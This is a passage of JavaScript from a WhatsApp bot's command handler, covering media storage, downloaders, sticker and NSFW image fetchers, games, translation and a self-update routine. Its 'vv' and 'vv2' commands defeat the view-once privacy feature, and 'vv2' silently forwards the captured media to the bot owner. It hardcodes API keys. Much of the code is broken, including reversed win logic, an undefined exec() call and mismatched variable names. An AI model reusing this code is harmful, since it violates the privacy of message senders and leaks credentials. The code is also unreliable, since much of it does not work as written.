                if (!isCreator) return replydare(mess.owner)
if (!args[0]) return replydare(`Use ${prefix+command} nomor\nExample ${prefix+command} 923444844060`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(owner))
replydare(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
            case 'addvideo': {
                if (!isPremium) return replydare(mess.prem)
                if (args.length < 1) return replydare('Video Name?')
                if (VideoXeon.includes(q)) return replydare("The name you entered already exists")
                let delb = await dare.downloadAndSaveMediaMessage(quoted)
                VideoXeon.push(q)
                await fsx.copy(delb, `./dmedia/video/${q}.mp4`)
                fs.writeFileSync('./dtbs/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(delb)
                replydare(`Success Adding Video\To View Type ${prefix}listvideo`)
            }
            break
            case 'delvideo': {
                if (!isPremium) return replydare(mess.prem)
                if (args.length < 1) return replydare('Enter the Video Name')
                if (!VideoXeon.includes(q)) return replydare("Name Does Not Exist")
                let wxmenu_oh = VideoXeon.indexOf(q)
                VideoXeon.splice(wxmenu_oh, 1)
                fs.writeFileSync('./dtbs/autoreply/video.json', JSON.stringify(VideoXeon))
                fs.unlinkSync(`./dmedia/video/${q}.mp4`)
                replydare(`Successfully Deleted Video ${q}`)
            }
            break
            case 'addimage': {
                if (!isPremium) return replydare(mess.prem)
                if (args.length < 1) return replydare('The name of the image?')
                if (Imagedare.includes(q)) return replydare("The name you entered is already registered in the database")
                let delb = await dare.downloadAndSaveMediaMessage(quoted)
                Imagedare.push(q)
                await fsx.copy(delb, `./dmedia/image/${q}.jpg`)
                fs.writeFileSync('./dtbs/autoreply/image.json', JSON.stringify(Imagedare))
                fs.unlinkSync(delb)
                replydare(`Success In Adding Image\nTo Check Type ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replydare(mess.prem)
                if (args.length < 1) return replydare('Enter the Image Name')
                if (!Imagedare.includes(q)) return replydare("The image name you entered is not registered")
                let wxmenu_oh = Imagedare.indexOf(q)
                Imagedare.splice(wxmenu_oh, 1)
                fs.writeFileSync('./dtbs/autoreply/image.json', JSON.stringify(Imagedare))
                fs.unlinkSync(`./dmedia/image/${q}.jpg`)
                replydare(`Successfully Deleted Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replydare(mess.prem)
                if (args.length < 1) return replydare('Enter the name of the sticker?')
                if (StickerXeon.includes(q)) return replydare("Name Already In Use")
                let delb = await dare.downloadAndSaveMediaMessage(quoted)
                StickerXeon.push(q)
                await fsx.copy(delb, `./dmedia/sticker/${q}.webp`)
                fs.writeFileSync('./dtbs/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(delb)
                replydare(`Successfully Adding Sticker\To Check Type ${prefix}liststicker`)
            }
            break
            case 'delsticker': {
                if (!isPremium) return replydare(mess.prem)
                if (args.length < 1) return replydare('Enter the name of the sticker')
                if (!StickerXeon.includes(q)) return replydare("Name Not Registered in Database")
                let wxmenu_oh = StickerXeon.indexOf(q)
                Stickerdare.splice(wxmenu_oh, 1)
                fs.writeFileSync('./dtbs/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./dmedia/sticker/${q}.webp`)
                replydare(`Successfully Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replydare(mess.prem)
                if (args.length < 1) return replydare('Enter the Name?')
                if (VoiceNoteXeon.includes(q)) return replydare("Name Already In Use")
                let delb = await dare.downloadAndSaveMediaMessage(quoted)
                VoiceNoteXeon.push(q)
                await fsx.copy(delb, `./dmedia/audio/${q}.mp3`)
                fs.writeFileSync('./dtbs/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(delb)
                replydare(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replydare(mess.prem)
                if (args.length < 1) return replydare('Enter the Name')
                if (!VoiceNoteXeon.includes(q)) return replydare("Name Not Registered in Database")
                let wxmenu_oh = VoiceNoteXeon.indexOf(q)
                VoiceNoteXeon.splice(wxmenu_oh, 1)
                fs.writeFileSync('./dtbs/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./dmedia/audio/${q}.mp3`)
                replydare(`Successfully Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replydare(mess.prem)
await loading()
if (args.length < 1) return replydare(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replydare("This name is already in use")
let delb = await dare.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./dmedia/zip/${teks}.zip`)
fs.writeFileSync('./dtbs/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replydare(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replydare(mess.prem)
await loading()
if (args.length < 1) return replydare('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replydare("This name does not exist in the database")
let wxmenu_oh = ZipXeon.indexOf(teks)
ZipXeon.splice(wxmenu_oh, 1)
fs.writeFileSync('./dtbs/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./dmedia/zip/${teks}.zip`)
replydare(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replydare(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replydare(mess.prem)
await loading()
if (args.length < 1) return replydare('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replydare("This name is already in use")
let delb = await dare.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./dmedia/apk/${teks}.apk`)
fs.writeFileSync('./dtbs/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replydare(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replydare(mess.prem)
await loading()
if (args.length < 1) return replydare('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replydare("This name does not exist in the database")
let wxmenu_oh = ApkXeon.indexOf(teks)
ApkXeon.splice(wxmenu_oh, 1)
fs.writeFileSync('./dtbs/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./dmedia/apk/${teks}.apk`)
replydare(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replydare(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replydare(mess.prem)
await loading()
if (args.length < 1) return replydare('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replydare("This name is already in use")
let delb = await dare.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./dmedia/doc/${teks}.pdf`)
fs.writeFileSync('./dtbs/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replydare(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return replydare(mess.prem)
await loading()
if (args.length < 1) return replydare('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replydare("This name does not exist in the database")
let wxmenu_oh = DocApk.indexOf(teks)
docunye.splice(wxmenu_oh, 1)
fs.writeFileSync('./dtbs/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./dmedia/doc/${teks}.pdf`)
replydare(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replydare(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return replydare(mess.group)
                if (isAfkOn) return replydare("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replydare(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
           
                     case 'play2': case 'songs': {
 replydare(mess.wait)
let yts = require("yt-search")
if (!text) return m.reply('*ERROR REQUEST!! EXAMPLE :*\n> *.ytmp3 <link youtube>*')
try {
let search = await yts(text);
let anup3k = search.videos[0];
let { title, thumbnail, timestamp, views, ago, url } = anup3k;
let procees = await (await fetch(`https://widipe.com/download/ytdl?url=${url}`)).json()
             let doc = { 
    audio: {
      url: procees.result.mp3
    },
    mimetype: 'audio/mp4',
    fileName: `${title}`,
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: url,
        title: title,
        sourceUrl: url,
        thumbnail: await (await dare.getFile(thumbnail)).data
      }
    }
  }
  await dare.sendMessage(m.chat, doc, { quoted: m });
} catch (e) {
    replydare('*an error occurred :*' + e)
}
}
break
case 'spotify': 
case 'spotifysearch': 
case 'spotifys': {
  if (!text) return replydare('Enter song/artist title!');
  const result = await searchSpotify(text);
  const searchResults = result.map((song, index) => `${index + 1}. ${song.name}\nArtist: ${result.artis}\n Link: ${song.link}\n\n`);
  reply(`Spotify Search Results for "${text}":\n\n` + searchResults.join(''));
}
break;
case 'spdl': case 'spotifydl': {
if (!text) return replydare('Enter Link')
let result = await spotifydl(text)
let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\n𝐃𝐀𝐑𝐄-𝐕𝟑`
 const p = await new canvafy.Spotify()
            .setTitle(result.title)
            .setAuthor("Spotify - Downloader")
            .setTimestamp(40, 100)
            .setOverlayOpacity(0.8)
            .setBorder("#fff", 0.8)
            .setImage(result.image)
            .setBlur(3)
            .build(); 

       await dare.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
    dare.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + '𝐃𝐀𝐑𝐄-𝐕𝟑' }, { quoted: m });
}
break
case 'ytmp3':
case 'youtubemp3': {
    if (!text) {
        return m.reply(`Example: ${prefix + command} oseba`);
    }

    // Call the API for audio download
    const apiUrl = `https://apitoxxictechinc.vercel.app/api/ytdl2?title=${encodeURIComponent(text)}&apikey=riasadmin`;
    
    try {
        const response = await fetch(apiUrl);
        const data = await response.json();

        // Check if there's an error in the response
        if (data.error) {
            return m.reply(`Error: ${data.error}`);
        }

        // Extract audio information
        const audio = data.audio;
        if (!audio || !audio.url) {
            return m.reply("No audio available for this title.");
        }

        // Create and send the audio message
        const audioMessage = {
            audio: { url: audio.url },
            mimetype: 'audio/mpeg',
            ptt: true,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: audio.url,
                    title: audio.title,
                    body: `Now Playing: ${audio.title} by ${audio.channel}`,
                    sourceUrl: audio.url,
                    thumbnail: await (await fetch(audio.thumb)).buffer(),
                },
            },
        };

        return dare.sendMessage(m.chat, audioMessage, { quoted: m });

    } catch (error) {
        console.error("Error fetching audio:", error);
        return m.reply('An error occurred while processing your request.');
    }
}
break
case 'ytmp4': case 'youtubemp4': {
if (!isCreator) return m.reply('*Only Premium*')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let { ytv } = require('./lib/y2mate')
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return m.reply('File exceeds limits '+util.format(media))
haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP4\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
}
break
        case 'shinobu': {
                    axios.get(`https://api.waifu.pics/sfw/shinobu`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickhandhold': {
                    axios.get(`https://api.waifu.pics/sfw/handhold`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickshinobu': {
                    axios.get(`https://api.waifu.pics/sfw/shinobu`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickhighfive': {
                    axios.get(`https://api.waifu.pics/sfw/highfive`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickcuddle': {
                    axios.get(`https://api.waifu.pics/sfw/cuddle`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickcringe': {
                    axios.get(`https://api.waifu.pics/sfw/cringe`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickdance': {
                    axios.get(`https://api.waifu.pics/sfw/dance`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickhappy': {
                    axios.get(`https://api.waifu.pics/sfw/happy`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickglomp': {
                    axios.get(`https://api.waifu.pics/sfw/glomp`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'sticksmug': {
                    axios.get(`https://api.waifu.pics/sfw/smug`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickblush': {
                    axios.get(`https://api.waifu.pics/sfw/blush`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
            case 'stickawoo': {
                    axios.get(`https://api.waifu.pics/sfw/awoo`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
                case 'hot': {
    if (!isCreator) return replydare(`Please choose one: heads or tails.\nExample: ${prefix}hot tails`);
    
    const userChoice = q.toLowerCase();
    const validChoices = ['head','tails'];
    if (!validChoices.includes(userChoice)) {
        return replydare("Invalid choice. Please choose 'head', or 'tails'.");
    }

    // Bot's random choice
    const botChoice = validChoices[Math.floor(Math.random() * validChoices.length)];

    // Determine the winner
    let result;
    if (userChoice === botChoice) {
        result = "It's a draw!";
    } else if (
        (userChoice === 'head' && botChoice === 'tails') ||
        (userChoice === 'tails' && botChoice === 'tails') ||
        (userChoice === 'head' && botChoice === 'head') ||
        (userChoice === 'tails' && botChoice === 'head')
    ) {
        result = "You win! 🎉";
    } else {
        result = "You lose! 😢";
    }

    // Send the result
    replydare(`🤖 *Head or tails*\n\nYou chose: *${userChoice}*\nI chose: *${botChoice}*\n\n*Result:* ${result}`);
    break;
}
case 'rps': {
    if (!isCreator) return replydare(`Please choose one: rock, paper, or scissors.\nExample: ${prefix}rps rock`);
    
    const userChoice = q.toLowerCase();
    const validChoices = ['rock', 'paper', 'scissors'];
    if (!validChoices.includes(userChoice)) {
        return replydare("Invalid choice. Please choose 'rock', 'paper', or 'scissors'.");
    }

    // Bot's random choice
    const botChoice = validChoices[Math.floor(Math.random() * validChoices.length)];

    // Determine the winner
    let result;
    if (userChoice === botChoice) {
        result = "It's a draw!";
    } else if (
        (userChoice === 'rock' && botChoice === 'scissors') ||
        (userChoice === 'paper' && botChoice === 'rock') ||
        (userChoice === 'scissors' && botChoice === 'paper')
    ) {
        result = "You win! 🎉";
    } else {
        result = "You lose! 😢";
    }

    // Send the result
    replydare(`🤖 *Rock, Paper, Scissors*\n\nYou chose: *${userChoice}*\nI chose: *${botChoice}*\n\n*Result:* ${result}`);
    break;
}
            case 'stickwave': {
            await dare.sendMessage(m.chat, { react: { text: '🍭', key: m.key } });
                    axios.get(`https://api.waifu.pics/sfw/wave`)
                    .then(({
                        data
                    }) => {
                        dare.sendImageAsSticker(m.chat, data.url, m, {
                            packname: global.packname, author: global.author
                        })
                    })
                }
                break
                
                case 'txt2img': {
    await dare.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } });

    if (!text) return m.reply(`Usage: ${prefix}txt2img <prompt>`);
    try {
        const apiUrl = `https://apitoxxictechinc.vercel.app/api/txt2img?prompt=${encodeURIComponent(text)}&apikey=toxxicboy`;
        const apiResponse = await axios.get(apiUrl);
        if (apiResponse.data.status !== 'success' || !apiResponse.data.result) {
            throw new Error('Failed to generate image from the API.');
        }

        const imageUrl = apiResponse.data.result;
        const imageMessage = {
            image: { url: imageUrl },
            caption: `KELVIN-V2 RESULTS ON ${text}`,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    mediaType: 2,
                    mediaUrl: imageUrl,
                    title: "Image Generation",
                    body: `Prompt: ${text}`,
                    sourceUrl: imageUrl,
                    thumbnail: await (await axios.get(imageUrl, { responseType: 'arraybuffer' })).data,
                },
            },
        };
        return dare.sendMessage(m.chat, imageMessage, { quoted: m });
    } catch (error) {
        console.error(error);
        m.reply('An error occurred: ' + error.message);
    }
}
break;

case 'dev': case 'dare': {
await dare.sendMessage(m.chat, { react: { text: `👑️`, key: m.key }})
replydare(`═════════════════════╼
│    *「 𝐌𝐲 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧🎗️」*
│ *ᴺᵃᵐᵉ*   : *LOST BOY* 
│ *ᴬᵍᵉ*     : *𝐈𝐦 𝟏4 𝐲𝐞𝐚𝐫𝐬* 
│ *ᴴᵒᵇᵇʸ*   : *TECH* 
│ *ᴿᵒˡᵉ*       : *TOXXIC* 
│ *ᵂᵒʳᵈˢ*   : *TYPE SHII* 
│ *ˢᵗᵃᵗᵘˢ*    : *𝐀𝐥𝐢𝐯𝐞* 
│  ●dare 
╰━━━━━━━━━━━━━━━━━━━━━━━━━╼`)
}
break




case 'readviewonce': case 'vv': {
	if (!m.quoted) return replydare(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replydare(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return dare.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return dare.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'vv2': {
	if (!m.quoted) return replydare(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replydare(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return dare.sendFile(dare.user.id, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return dare.sendFile(dare.user.id, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case "remini": case "tohd": case "hd": {
if (/image/g.test(mime)) {
m.reply(msg.wait)
let tingkat
if (/remini/gi.test(command)) tingkat = 4
if (/tohd|hd/gi.test(command)) tingkat = 2
await dare.downloadAndSaveMediaMessage(qmsg).then(async (res) => {
let urlnya = await telegraPh(res)
let image = await fetchJson(`https://aemt.me/remini?url=${urlnya}&resolusi=${tingkat}`)
if (!image.status) return m.reply("Error!")
await dare.sendMessage(m.chat, {image: {url: image.url}, caption: "Donel ✅"}, {quoted: m})
await fs.unlinkSync(res)
}).catch(err => m.reply(err.toString()))
} else return m.reply(example('Reply to an image'))
}
break
case 'ttt':
case 'ttc':
case 'tictactoe': {
if (!m.isGroup) return onlyGrup()
let TicTacToe = require("./lib/game/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return m.reply( 'You are still in the game!')
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Opponent found !')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Wait  @${room.game.currentTurn.split('@')[0]}

Type .nyerah to surrender `
if (room.x !== room.o) await dare.sendText(room.x, str, m, { mentions: parseMention(str) } )
await dare.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Waiting for opponent to play ' + (text ? ` type the command below  ${prefix+command} ${text}` : ''))
this.game[room.id] = room
}
}
break

case 'tiktokvideo':{
if (!isCreator) return replydare('*Only Premium Members Are Allowed To Use This Command*')
if (!text) return replydare( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return replydare(`Link Invalid!!`)
await loading ()
require('./lib/tiktok').Tiktok(q).then( data => {
dare.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
})
}
break
case 'tagadmin':
case 'listadmin': {
    if (!m.isGroup) return replydare("This command can only be used in groups")
    const groupAdmins = participants.filter(p => p.admin);
    const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n');
    replydare(`*Group Admins:*\n${listAdmin}`, { mentions: groupAdmins.map(v => v.id) });
}
break;
case 'trap':
   
    if (!isPremium) return onlyPremium();
    
    await loading();
    let trap = await axios.get(`https://waifu.pics/api/nsfw/${command}`);
    dare.sendMessage(m.chat, { caption: '> KELVIN-V2', image: { url: trap.data.url } }, { quoted: m });
    break;

case 'hneko':
    
    if (!isPremium) return onlyPremium();

    await loading();
    let hneko = await axios.get(`https://waifu.pics/api/nsfw/neko`);
    dare.sendMessage(m.chat, { caption: '> KELVIN-V2', image: { url: hneko.data.url } }, { quoted: m });
    break;

case 'nwaifu':
    
    if (!isPremium) return onlyPremium();
      await loading();
    let waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`);
    dare.sendMessage(m.chat, { caption: '> KELVIN-V2', image: { url: waifudd.data.url } }, { quoted: m });
    break;

case 'animespank':
    if (!isPremium) return onlyPremium();

    await loading();
    let waifud = await axios.get(`https://nekos.life/api/v2/img/spank`);
    dare.sendMessage(m.chat, { caption: '> KELVIN-V2', image: { url: waifud.data.url } }, { quoted: m }).catch(err => {
        return ('Error!');
    });
    break;

case 'gifblowjob':
    
    if (!isPremium) return onlyPremium();
    
    await loading();
    let assss = await axios.get("https://api.waifu.pics/nsfw/blowjob");
    var bobuff = await fetchBuffer(assss.data.url);
    var bogif = await buffergif(bobuff);
    dare.sendMessage(m.chat, { video: bogif, gifPlayback: true }, { quoted: m }).catch(err => { });
    break;
      case 'listcase': {
    const listCase = () => {
        const code = fs.readFileSync("./kelvin.js", "utf8");
        var regex = /case\s+'([^']+)':/g;
        var matches = [];
        var match;
        while ((match = exec(code))) {
            matches.push(match[1]);
        }
        let teks = `*Total Case*: ${matches.length} \n\n`;
        matches.forEach(function (x) {
            teks += "☞ " + x + "\n"; // Added space after "☞"
        });
        teks += "\n> KELVIN-V2";
        return teks;
    };
    replydare(listCase());
}
break;
case 'ss':
case 'ssweb': {
    if (!q) return replydare("✏️ *Enter a link.*\n\n Eg: `https://www.example.com`");
    if (!isUrl(args[0]) && !args[0].includes('www.')) return replydare("⚠️ *Invalid Link!*\n\nmake sure it includes 'ww.' 'http://' 𝓸𝓻 'https://'.");
    await loading();
    let Url = `https://api.apiflash.com/v1/urltoimage?access_key=185eff3aa9fe4e3c8e30bda63b1fb9cf&wait_until=page_loaded&url=${q}`;
    
    dare.sendMessage(from, { 
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true, 
                title: `${botName}`, 
                mediaType: 3, 
                renderLargerThumbnail: false,
                thumbnail: thumb,
                sourceUrl: `https://whatsapp.com/channel/0029ValF0TZEAKWNPknJ6I0I`
            }
        }, 
        image: { url: Url }, 
        caption: `✅ *> KELVIN-V2!*`,
    }, { quoted: m })
    .catch((err) => replydare("⚠️ *Err!*\n\nTry again."));
}
break;
case 'tourl': 
case 'url': {
    try {
        loading(); // Notify the user that the upload is starting

        // Download and save the media
        const media = await dare.downloadAndSaveMediaMessage(qmsg);
        console.log("Media downloaded:", media);

        if (!media) throw new Error("Failed to download media");

        // Check if the file exists and its size
        const stats = await fs.promises.stat(media);
        if (stats.size === 0) {
            throw new Error("The downloaded media file is empty.");
        }

        let responseUrl;
        const mediaType = qmsg.mimetype; // Assuming qmsg has a mimetype property

        if (mediaType.startsWith('image/')) {
            // Upload image to catbox.moe
            responseUrl = await uploadToCatbox(media);
        } else {
            // Upload other media to file.io
            responseUrl = await uploadToFileIo(media);
        }

        if (!responseUrl) throw new Error("Failed to upload file");

        // Send the URL to the user
        m.reply(util.format(responseUrl));

        // Remove the media from storage after upload
        await fs.promises.unlink(media);
    } catch (error) {
        console.error('Error during the URL upload process:', error.message);
        replydare('An error occurred while uploading the file. Please try again.');
    }
}
break

case 'fbvideo':
			if (args.length == 0) return replydare(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
			await loading()
			axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				dare.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn` })
			})
			break
			case 'translate': {
    const langAbbreviation = args[0]; // Get the language abbreviation from the arguments
    const textToTranslate = m.quoted?.text || args.slice(1).join(' '); // Check if replying to a message or taking input

    // Check if language abbreviation is provided
    if (!langAbbreviation || !textToTranslate) {
        return replydare(`\`what should i translate\`\n*𝔼𝕩𝕒𝕞𝕡𝕝𝕖: ${prefix + command} en Hola
        > ALWAYS BRING "EN" BEFORE WORD`);
    }

    try {
        await loading();

        // API call
        const apiUrl = `https://api.popcat.xyz/translate?to=${langAbbreviation}&text=${encodeURIComponent(textToTranslate)}`;
        const response = await fetch(apiUrl);
        const json = await response.json();

        // Log the API response to the console
        console.log("Translation Response:", json);

        
// Validate API response
if (!json.translated) {
    return replydare("Failed🙃.");
}

// Send the translated text
replydare(`*Translated text:*\n\n\`\`\`${json.translated}\`\`\``);


    } catch (error) {
        console.error("Error in translate case:", error);
        replydare("Error occured😑.");
    }
    break;
}
	//update
case 'update': {
    if (!isCreator) return ownernya(); // Check if the user has the right permission
    const repoOwner = 'dare1-TCH'; // Replace with your GitHub username
    const repoName = 'C_Suit_v2'; // Replace with your repository name
    const branch = 'main';           // Replace with your branch name if different
    const localDir = './';  // Directory to save downloaded files

    // Create local directory if it doesn't exist
    if (!fs.existsSync(localDir)){
        fs.mkdirSync(localDir);
    }

    // Function to download a file from GitHub
    async function downloadFile(filePath) {
        const rawUrl = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/${branch}/${filePath}`;
        
        try {
            replydare(`Downloading: ${filePath}`); // Inform user about the download process
            const response = await fetch(rawUrl);
            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
            
            const data = await response.text();
            const localFilePath = path.join(localDir, filePath);

            // Ensure the directory exists for nested paths
            fs.mkdirSync(path.dirname(localFilePath), { recursive: true });

            // Save the file locally
            fs.writeFileSync(localFilePath, data, 'utf8');
            replydare(`Successfully updated: ${filePath}`); // Inform user about the success
        } catch (error) {
            replydare(`Error downloading file: ${filePath} - ${error.message}`);
            replydare('KELVIN-V2 Auto Update Failed\nPlease Type .repo and Sync Fork and redeploy the Latest Version!');
        }
    }

    // Example list of files to download
    const filesToDownload = [
        'kelvin.js' // Replace with actual file paths in your repo
    ];

    // Start the update process and notify the user
    replydare('Starting update process...');

    // Download each file
    Promise.all(filesToDownload.map(file => downloadFile(file)))
        .then(() => {
            replydare('KELVIN-V2 Has Automatically Updated To Latest Version');
        })
        .catch(() => {
            replydare('Some files failed to update.');
        });

    break;	
}
//new cmds
case 'bing': 
case 'bingai': {
if (!isCreator) return replydare(`🙂 *Want to ask Bing something?*`)
